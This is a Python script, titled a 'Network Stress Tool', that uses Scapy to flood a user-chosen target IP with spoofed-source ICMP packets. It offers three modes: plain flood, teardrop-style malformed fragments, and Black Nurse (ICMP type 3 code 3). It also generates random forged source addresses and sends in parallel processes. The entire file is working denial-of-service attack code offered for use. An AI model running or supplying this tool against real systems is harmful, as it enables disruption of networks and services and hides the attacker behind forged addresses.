import logging
import random
import time
from multiprocessing import Pool
from scapy.all import IP, ICMP, send, conf
import warnings

# Ignore SyntaxWarnings globally (not recommended unless you understand consequences)
warnings.filterwarnings("ignore", category=SyntaxWarning)


# Silence Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

# Constants
PAYLOAD = "suchaload" * 162

def get_user_input(prompt, valid_options=None, default=None):
    while True:
        value = input(prompt).strip()
        if not value and default is not None:
            return default
        if valid_options and value not in valid_options:
            print(f"[!] Invalid input. Valid options are: {valid_options}")
        elif value:
            return value

def get_random_ips(n):
    return [
        f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        for _ in range(int(n))
    ]

def get_ips_from_file(n, filename="ips.txt"):
    try:
        with open(filename, "r") as file:
            base_ips = [line.strip() for line in file if line.strip()]
        if not base_ips:
            print("[-] Error: ips.txt is empty.")
            exit(1)
    except FileNotFoundError:
        print("[-] Error: ips.txt not found.")
        exit(1)

    full_list = (base_ips * (int(n) // len(base_ips))) + base_ips[:int(n) % len(base_ips)]
    return full_list

# Packet sending functions
def send_flood(args):
    src_ip, dst_ip, iface, count = args
    send((IP(dst=dst_ip, src=src_ip) / ICMP() / PAYLOAD) * count, iface=iface)

def send_teardrop(args):
    src_ip, dst_ip, iface, count = args
    send((IP(dst=dst_ip, src=src_ip, flags="MF", proto=17, frag=0) / ICMP() / PAYLOAD) * count, iface=iface)

def send_blacknurse(args):
    src_ip, dst_ip, iface, count = args
    send((IP(dst=dst_ip, src=src_ip) / ICMP(type=3, code=3)) * count, iface=iface)

def main():
    print("=== Network Stress Tool (Interactive) ===")

    dst_ip = get_user_input("Target IP address: ")
    n_ips = int(get_user_input("Number of source IPs: "))
    n_msg = int(get_user_input("Messages per IP: "))
    iface = get_user_input("Interface to use (e.g., eth0): ")

    print("\nSelect attack type:")
    print("1) Flood\n2) Teardrop\n3) Black Nurse")
    attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])

    print("\nSelect source IP origin:")
    print("1) From ips.txt\n2) Randomly generated")
    origin_type = get_user_input("Your choice (1/2): ", valid_options=["1", "2"])

    thread_count = int(get_user_input("Number of threads [default 3]: ", default="3"))

    if origin_type == "1":
        ips = get_ips_from_file(n_ips)
    else:
        ips = get_random_ips(n_ips)

    args_list = [(ip, dst_ip, iface, n_msg) for ip in ips]

    print(f"\n[+] Starting attack on {dst_ip} with {n_ips} IPs using {thread_count} threads...")

    start_time = time.time()

    with Pool(thread_count) as pool:
        if attack_type == "1":
            pool.map(send_flood, args_list)
        elif attack_type == "2":
            pool.map(send_teardrop, args_list)
        elif attack_type == "3":
            pool.map(send_blacknurse, args_list)

    duration = time.time() - start_time
    total_packets = n_ips * n_msg
    speed = total_packets / duration if duration > 0 else 0

    print("\n=== Attack Complete ===")
    print(f"Time elapsed: {duration:.2f} seconds")
    print(f"Total packets sent: {total_packets}")
    print(f"Approx. Speed: {speed:.2f} packets/sec")

if __name__ == "__main__":
    main()
